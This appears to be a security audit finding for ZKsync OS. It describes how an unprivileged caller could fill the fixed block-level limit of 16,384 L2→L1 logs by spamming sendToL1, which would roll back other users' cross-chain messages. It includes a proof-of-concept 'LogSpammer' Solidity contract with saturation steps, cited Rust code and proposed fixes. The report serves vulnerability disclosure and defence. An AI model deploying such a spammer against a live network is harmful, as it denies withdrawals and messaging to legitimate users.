### Title
Block-Level L2→L1 Log Limit Saturation Enabling Denial of Service for Cross-Chain Messaging — (`zk_ee/src/common_structs/logs_storage.rs`)

---

### Summary

An unprivileged attacker can saturate the fixed block-level `MAX_NUMBER_OF_LOGS = 16_384` limit by repeatedly calling `sendToL1` on the L1 Messenger system contract (`0x8008`). Once the limit is reached, every subsequent transaction in the same block that emits even a single L2→L1 log is rejected with `BlockL2ToL1LogsLimitReached` and fully rolled back. This is a direct analog of the `MAX_DELEGATES` saturation pattern: a static, shared, per-block resource cap that any unprivileged caller can exhaust, denying service to legitimate users.

---

### Finding Description

**Fixed limit and its location**

`MAX_NUMBER_OF_LOGS` is declared as a block-scoped constant: [1](#0-0) 

The `push_message` function in `LogsStorage` appends a new log entry unconditionally — it performs **no check** against `MAX_NUMBER_OF_LOGS`: [2](#0-1) 

**Where the limit is enforced**

The limit is only checked in `check_for_block_limits`, called from the ZK transaction loop **after** a transaction has already been fully executed: [3](#0-2) 

When the check fails, the entire transaction is rolled back via `finish_global_frame(Some(&pre_tx_rollback_handle))` and recorded as a validation error: [4](#0-3) 

**Attacker-controlled entry path**

The L1 Messenger system hook at `0x7001` is callable by any transaction that routes through the L1 Messenger system contract at `0x8008`. The hook documentation confirms this is a user-facing interface: [5](#0-4) 

The hook calls `emit_l1_message`, which calls `push_message` with no per-block count guard: [6](#0-5) 

The `emit_l1_message` implementation in the IO subsystem also performs no count check before pushing: [7](#0-6) 

**Attack mechanics**

1. Attacker deploys a contract that calls `sendToL1(bytes)` in a tight loop.
2. Each call costs ~9,202 EVM gas (confirmed by the existing test suite) and emits one L2→L1 log entry.
3. Attacker submits transactions that each emit hundreds or thousands of messages, filling the block's log count toward 16,384.
4. Because `push_message` has no guard, the logs accumulate freely during execution.
5. The attacker's transactions that stay within the limit are committed; the final one that crosses the limit is rolled back (attacker loses that gas).
6. All subsequent transactions in the block that call `sendToL1` — regardless of sender — are rejected with `BlockL2ToL1LogsLimitReached` and rolled back.

---

### Impact Explanation

- **Denial of Service for L2→L1 messaging**: Any user or contract that needs to send a cross-chain message (e.g., initiating a withdrawal, sending an L1 notification) in the targeted block is silently excluded. Their transaction is rolled back as if it never happened.
- **Block-scoped, repeatable**: The attacker can repeat this every block, continuously preventing legitimate L2→L1 messaging.
- **No per-sender rate limit**: There is no mechanism to distinguish attacker-originated logs from legitimate ones before the block limit is hit.

The `MAX_NUMBER_OF_LOGS` constant is tied to the fixed-size Merkle tree used for L2→L1 log commitments: [8](#0-7) 

This makes the limit structurally immovable without a protocol upgrade.

---

### Likelihood Explanation

- **Entry point is fully permissionless**: Any EOA or contract can call `sendToL1` on the L1 Messenger contract.
- **Cost is bounded and predictable**: At ~9,202 gas per message and 16,384 messages, the attacker needs roughly 150M gas worth of `sendToL1` calls spread across multiple transactions. On a ZKsync block with a high gas limit this is achievable within a single block; otherwise across a few blocks.
- **No privileged access required**: No governance, no leaked keys, no oracle manipulation.
- **Motivated attacker scenario**: Any party wishing to block a competitor's cross-chain withdrawal or time-sensitive L1 message has a clear economic incentive.

---

### Recommendation

1. **Per-transaction log count cap**: Enforce a per-transaction limit on L2→L1 messages inside `push_message` or `emit_l1_message`, so a single transaction cannot consume a disproportionate share of the block's log budget.

2. **Pre-execution guard**: Check the remaining log budget before executing a transaction (not only after), and reject transactions that cannot possibly fit given the current block log count. This prevents wasted execution and rollback overhead.

3. **Proportional gas pricing for log slots**: Increase the EVM gas cost of `sendToL1` dynamically as the block's log count approaches `MAX_NUMBER_OF_LOGS`, analogous to EIP-1559 base fee mechanics, making saturation attacks economically prohibitive.

---

### Proof of Concept

**Step 1 — Deploy a log-spammer contract:**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IL1Messenger {
    function sendToL1(bytes calldata _message) external returns (bytes32);
}

contract LogSpammer {
    IL1Messenger constant MESSENGER =
        IL1Messenger(0x0000000000000000000000000000000000008008);

    /// Emit `count` L2→L1 messages in one transaction.
    function spam(uint256 count) external {
        bytes memory msg_ = hex"deadbeef";
        for (uint256 i = 0; i < count; i++) {
            MESSENGER.sendToL1(msg_);
        }
    }
}
```

**Step 2 — Fill the block log budget:**

```
// Each call to spam(N) emits N logs.
// Repeat until block log count approaches MAX_NUMBER_OF_LOGS (16384).
// e.g., call spam(3000) five times across five transactions.
```

**Step 3 — Demonstrate victim rejection:**

```solidity
// Victim contract tries to send one L2→L1 message.
contract Victim {
    IL1Messenger constant MESSENGER =
        IL1Messenger(0x0000000000000000000000000000000000008008);

    function sendMessage() external {
        MESSENGER.sendToL1(hex"cafebabe");
    }
}
```

After the attacker's transactions are included, the victim's `sendMessage` transaction is rejected with `BlockL2ToL1LogsLimitReached` and fully rolled back — even though the victim's transaction is otherwise valid and well-funded.

**Relevant constants and code paths:**

- `MAX_NUMBER_OF_LOGS = 16_384`: [9](#0-8) 
- `push_message` (no limit check): [2](#0-1) 
- `check_for_block_limits` (post-execution only): [3](#0-2) 
- Transaction rollback on limit breach: [10](#0-9) 
- L1 Messenger hook (permissionless user entry): [11](#0-10)

### Citations

**File:** zk_ee/src/common_structs/logs_storage.rs (L23-25)
```rust
pub const L2_TO_L1_LOG_SERIALIZE_SIZE: usize = 88;
// Taken from the size of the Merkle tree.
pub const MAX_NUMBER_OF_LOGS: u64 = 16_384;
```

**File:** zk_ee/src/common_structs/logs_storage.rs (L181-211)
```rust
    pub fn push_message(
        &mut self,
        tx_number: u32,
        address: &B160,
        data: UsizeAlignedByteBox<A>,
        data_hash: Bytes32,
    ) -> Result<(), SystemError> {
        // We are publishing message data(4 bytes to encode length) and underlying log
        // TODO: double check that we should have 4 here
        let total_pubdata = 4 + data.len() + L2_TO_L1_LOG_SERIALIZE_SIZE;
        let total_pubdata = total_pubdata as u32;

        let total_pubdata = self
            .list
            .top()
            .map_or(total_pubdata, |(_, m)| *m + total_pubdata);

        self.list.push(
            LogContent {
                tx_number,
                data: GenericLogContentData::UserMsg(UserMsgData {
                    address: *address,
                    data,
                    data_hash,
                }),
            },
            total_pubdata,
        );

        Ok(())
    }
```

**File:** basic_bootloader/src/bootloader/block_flow/zk/mod.rs (L84-91)
```rust
    } else if !cfg!(feature = "resources_for_tester") && logs_used > MAX_NUMBER_OF_LOGS {
        // ZKsync OS-specific resources are not checked for evm tester
        system_log!(
            system,
            "Block logs limit reached, invalidating transaction\n"
        );
        Err(InvalidTransaction::BlockL2ToL1LogsLimitReached)
    } else {
```

**File:** basic_bootloader/src/bootloader/block_flow/zk/tx_loop.rs (L152-162)
```rust
                            if let Err(err) = check_for_block_limits(
                                system,
                                next_block_gas_used,
                                next_block_computational_native_used,
                                next_block_pubdata_used,
                                block_logs_used,
                                next_block_blob_gas_used,
                            ) {
                                // Revert to state before transaction
                                system.finish_global_frame(Some(&pre_tx_rollback_handle))?;
                                result_keeper.tx_processed(Err(err));
```

**File:** docs/system_hooks.md (L23-30)
```markdown
## L1 messenger system hook

The L1 messenger system hook (at address `0x7001`) is responsible for sending messages to L1.
It can only be called by the L1 messenger system contract at address `0x8008`.
The input should be the ABI-encoded parameters: sender address and message bytes.

Implementation of the L1 messenger system hook decodes the input and records the message using the system method.
Calls from any other caller are treated as calls to an empty account: success with empty returndata and no side effects.
```

**File:** system_hooks/src/call_hooks/l1_messenger.rs (L136-161)
```rust
pub(crate) fn send_to_l1_inner<S: EthereumLikeTypes>(
    calldata: &[u8],
    resources: &mut S::Resources,
    system: &mut System<S>,
) -> Result<Result<(), &'static str>, SystemError> {
    if calldata.len() < 20 {
        return Ok(Err(
            "L1 messenger failure: sendToL1 called with invalid calldata",
        ));
    }

    let address_sender = B160::try_from_be_slice(&calldata[0..20]).ok_or(
        SystemError::LeafDefect(internal_error!("Failed to create B160 from 20 byte array")),
    )?;

    let message = &calldata[20..];

    // emit L1 message (ignore returned hash)
    // TODO(EVM-1190): hash calculation is suboptimal, to be refactored in future
    system.io.emit_l1_message(
        // Gas should be charged by the L1Messenger system contract
        ExecutionEnvironmentType::NoEE,
        resources,
        &address_sender,
        message,
    )?;
```

**File:** basic_system/src/system_implementation/system/io_subsystem.rs (L185-227)
```rust
    fn emit_l1_message(
        &mut self,
        _ee_type: ExecutionEnvironmentType,
        resources: &mut Self::Resources,
        address: &<Self::IOTypes as SystemIOTypesConfig>::Address,
        data: &[u8],
    ) -> Result<Bytes32, SystemError> {
        // TODO(EVM-1077): consider adding COMPUTATIONAL_PRICE_FOR_PUBDATA as in Era

        // We need to charge cost of hashing:
        // - keccak256_native_cost(L2_TO_L1_LOG_SERIALIZE_SIZE) and
        //   keccak256_native_cost(64) when reconstructing L2ToL1Log
        // - keccak256_native_cost(64) + keccak256_native_cost(data.len())
        //   when reconstructing Messages
        // - at most 1 time keccak256_native_cost(64) when building the
        //   Merkle tree (as merkle tree can contain ~2*N nodes, where the
        //   first N nodes are leaves the hash of which is calculated on the
        //   previous step).

        let hashing_native_cost =
            keccak256_native_cost::<Self::Resources>(L2_TO_L1_LOG_SERIALIZE_SIZE).as_u64()
                + 3 * keccak256_native_cost::<Self::Resources>(64).as_u64()
                + keccak256_native_cost::<Self::Resources>(data.len()).as_u64();

        // We also charge some native resource for storing the log
        let native = hashing_native_cost
            + EVENT_STORAGE_BASE_NATIVE_COST
            + EVENT_DATA_PER_BYTE_COST * (data.len() as u64);

        resources.charge(&R::from_native(R::Native::from_computational(native)))?;

        // TODO(EVM-1078): for Era backward compatibility we may need to add events for l2 to l1 log and l1 message

        // Compute data hash directly: the native cost for this keccak is already
        // pre-charged above (included in `hashing_native_cost`), and this function
        // must not charge ergs — EVM gas accounting is the caller's responsibility
        // (the L1Messenger system contract charges it before invoking the hook).
        use crypto::MiniDigest;
        let data_hash = Bytes32::from_array(crypto::sha3::Keccak256::digest(data));
        let data = UsizeAlignedByteBox::from_slice_in(data, self.allocator.clone());
        self.logs_storage
            .push_message(self.tx_number, address, data, data_hash)?;
        Ok(data_hash)
```

**File:** docs/l1_integration.md (L119-120)
```markdown
As mentioned above, during batch processing we are building an l2 logs Merkle tree, so users can verify logs inclusion on the settlement layer.
This is going to be a fixed-size (16384) Merkle tree.
```
